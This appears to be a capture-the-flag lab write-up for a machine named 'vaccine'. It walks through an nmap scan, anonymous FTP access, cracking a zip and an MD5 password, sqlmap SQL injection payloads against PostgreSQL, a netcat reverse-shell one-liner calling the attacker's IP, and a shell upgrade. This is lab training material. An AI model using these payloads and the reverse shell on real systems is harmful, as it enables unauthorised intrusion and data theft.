-----
## IPS
victim=10.129.255.178


---
## Initial Scan 

- found that the machine is using ftp,http and ssh
```shell
nmap -sC -sV 10.129.255.178
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-04 14:36 EDT
Nmap scan report for 10.129.255.178
Host is up (0.035s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.17
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0ee58077534b00b9165b259569527a4 (RSA)
|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)
|_  256 425bc321dfefa20bc95e03421d69d028 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.13 seconds
```
 
---
## Foothold 

- this version of  FTP can use anonymous /no_password inorder to login. tried this and  manageed to login, found a backup.zip
```shell
ftp anonymous@10.129.255.178 
Connected to 10.129.255.178.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
ftp> 


```

- Used zip2john to crack the hash for the zipfile
```shell
 zip2john backup.zip >zip.hash
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                        
```

- I then used the main john the ripper script to pass in the hashes
```shell
john 
-wordlist=/usr/share/wordlists/rockyou.txt hashes
```

- Found the password  using john
```shell
┌──(root㉿kali)-[/home/kali/Desktop]
└─# john -wordlist=/usr/share/wordlists/rockyou.txt zip
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
No password hashes left to crack (see FAQ)
                                                        
┌──(root㉿kali)-[/home/kali/Desktop]
└─# john --show zip                                    
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip

1 password hash cracked, 0 left

```

- I then looked at the files in the backup and found the admin username and pasword that leads to a dashboard page
```php
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
```

- Cracked the passworrd using an online md5 code cracker 
- ![[Pasted image 20230404202802.png]]
On the site I tried to use sql inject using the 'OR '1 ='1 and this returned all the cars

- Used burp to get the req and put it into a file
![[Pasted image 20230404210302.png]]
- I then fed that into SQLMap in order to find the vunribilities
```shell
sqlmap -r ./new.req


[16:04:06] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)

[16:04:16] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
[16:04:16] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                                   
[16:04:26] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable           
[16:04:26] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                            

sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:                             
---                                                                                                                 
Parameter: search (GET)                                                                                             
    Type: boolean-based blind                                                                                       
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)                                       
    Payload: search=a' AND (SELECT (CASE WHEN (1219=1219) THEN NULL ELSE CAST((CHR(110)||CHR(122)||CHR(115)||CHR(88)) AS NUMERIC) END)) IS NULL-- SazX                                                                                  
                                                                                                                    
    Type: error-based                                                                                               
    Title: PostgreSQL AND error-based - WHERE or HAVING clause                                                      
    Payload: search=a' AND 5041=CAST((CHR(113)||CHR(113)||CHR(118)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (5041=5041) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(118)||CHR(107)||CHR(113)) AS NUMERIC)-- UOEe                
                                                                                                                    
    Type: stacked queries                                                                                           
    Title: PostgreSQL > 8.1 stacked queries (comment)                                                               
    Payload: search=a';SELECT PG_SLEEP(5)--                                                                         
                                                                                                                    
    Type: time-based blind                                                                                          
    Title: PostgreSQL > 8.1 AND time-based blind                                                                    
    Payload: search=a' AND 7914=(SELECT 7914 FROM PG_SLEEP(5))-- aUwp                                               
---                                                                                                                 
[16:04:26] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[16:04:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/vaccine.htb'

[*] ending @ 16:04:27 /2023-04-04/

```
- As we can get an OS shell I decided to add my own shell so I could create a reverse shell 
```shell
# on the victim machine
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.43 4444 >/tmp/f

#gives the following outpout on the kali machine
c -lvnp 4444 
listening on [any] 4444 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.235.123] 33392
sh: 0: can't access tty; job control turned off
$        
```
- decided to upgrade the shell so we can do auto tab
```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
postgres@vaccine:/var/lib/postgresql/11/main$ 

```
----
## Tags
#Web
#Network
#VulnerabilityAssessment
#Databases
#Injection
#CustomApplications
#Protocols
#SourceCodeAnalysis
#Apache
#PostgreSQL
#FTP
#PHP
#Reconnaissance
#PasswordCracking
#SUDOExploitation
#SQLInjection
#RemoteCodeExecution
#ClearTextCredentials
#Anonymous/GuestAccess

----
## Resource

Payload for vi to access root- https://gtfobins.github.io/gtfobins/vi/#shell